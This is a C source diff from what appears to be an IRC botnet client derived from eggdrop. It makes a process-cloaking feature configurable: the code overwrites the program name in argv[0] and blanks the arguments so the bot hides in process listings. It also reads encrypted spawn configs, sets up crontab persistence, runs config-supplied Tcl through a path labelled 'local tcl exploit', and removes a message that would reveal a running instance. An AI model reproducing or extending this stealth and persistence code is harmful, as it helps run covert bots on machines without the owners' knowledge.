@@ -100,6 +100,7 @@ uid_t   myuid;
 int	term_z = 1;		/* Foreground: use the terminal as a party
 				   line? */
 
+int pscloak = 1;
 int cpass = 0; /* check pass ? */
 int updating = 0; /* this is set when the binary is called from itself. */
 char tempdir[DIRMAX] = "";
@@ -1034,6 +1035,8 @@ static void gotspawn(char *filename)
     Context;
     temps = (char *) decrypt_string(netpass, decryptit(templine));
 
+    pscloak = atoi(newsplit(&temps));
+
     nick = newsplit(&temps);
     if (!nick)
       fatal("invalid config (2).",0);
@@ -1074,7 +1077,7 @@ static void gotspawn(char *filename)
 //  unlink(filename);
 }
 
-static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix)
+static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, int cloak)
 {
   char buf[DIRMAX], bindir[DIRMAX], bufrun[DIRMAX];
   FILE *fp;
@@ -1088,7 +1091,7 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix)
   if (!(fp = fopen(buf, "w")))
     fatal("Cannot create spawnfiles...", 0);
 
-  lfprintf(fp, "%s %s %s %s\n", nick, ip, host, ipsix);
+  lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip, host, ipsix);
 
   fflush(fp);
   fclose(fp);
@@ -1114,9 +1117,6 @@ int main(int argc, char **argv)
 #ifdef LEAF
   struct stat ss;
   int skip = 0;
-#ifdef S_PSCLOAK
-  int on;
-#endif
   FILE *fp;
   struct passwd *pw;
   char newbinbuf[DIRMAX], newbin[DIRMAX], confdir[DIRMAX], tmp[DIRMAX], 
@@ -1474,15 +1474,6 @@ Context;
 #endif
   chmod(cfile, S_IRUSR | S_IWUSR | S_IXUSR);
 
-#ifdef LEAF
-#ifdef S_PSCLOAK
-  on = 0;
-  strncpy(argv[0],progname(),strlen(argv[0]));
-  //this clears all the params..
-  for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
-#endif /* PSCLOAK */
-#endif /* LEAF */
-
 Context;
   init_language(1);
 
@@ -1561,8 +1552,12 @@ Context;
           fatal("Go away..",0);
         }
       } else if (c[0] == '!') { //local tcl exploit
-        newsplit(&temps);
-        Tcl_Eval(interp, temps);
+        if (c[1] == '-') { //dont use pscloak
+          pscloak = 0;
+        } else {
+          newsplit(&temps);
+          Tcl_Eval(interp, temps);
+        }
       } else if (c[0] != '#') {  //now to parse nick/hosts
         //we have the right uname/uid, safe to setup crontab now.
         i++;
@@ -1640,11 +1635,11 @@ Context;
             kill(xx, SIGCHLD);
             if (errno == ESRCH || (updating && !x)) { //PID is !running, safe to run.
 
-            if (spawnbot(binname, nick, ip, host, ipsix))
+            if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
                 printf("* Failed to spawn %s\n", nick); //This probably won't ever happen.
             } 
           } else {
-            if (spawnbot(binname, nick, ip, host, ipsix))
+            if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
               printf("* Failed to spawn %s\n", nick); //This probably won't ever happen.
           }
         }
@@ -1704,8 +1699,6 @@ Context;
       xx = atoi(s);
       kill(xx, SIGCHLD);
       if (errno != ESRCH) { //!= is PID is running.
-//    Let's keep silent.
-//        printf("I detect %s already running..\n", botnetnick);
         bg_send_quit(BG_ABORT);
         exit(1);
       }
@@ -1719,6 +1712,16 @@ Context;
 }
 #endif
 
+#ifdef LEAF
+#ifdef S_PSCLOAK
+  if (pscloak) {
+    int on = 0;
+    strncpy(argv[0],progname(),strlen(argv[0]));
+    //this clears all the params..
+    for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
+  }
+#endif /* PSCLOAK */
+#endif /* LEAF */
 
   i = 0;
   for (chan = chanset; chan; chan = chan->next)
